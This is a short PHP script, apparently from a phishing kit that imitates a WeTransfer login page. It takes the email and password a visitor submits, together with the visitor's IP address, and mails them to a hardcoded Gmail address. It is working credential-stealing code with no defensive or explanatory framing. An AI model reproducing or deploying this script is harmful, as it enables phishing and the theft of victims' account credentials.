<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['x1'];
 $password = $_POST['x2'];
 
		$to = "hikmetwestnunion@gmail.com";
		
		
         $subject = "WeTransfer : $ip";
		 
		 $message =  "Email ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: King-8 Vibes \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>


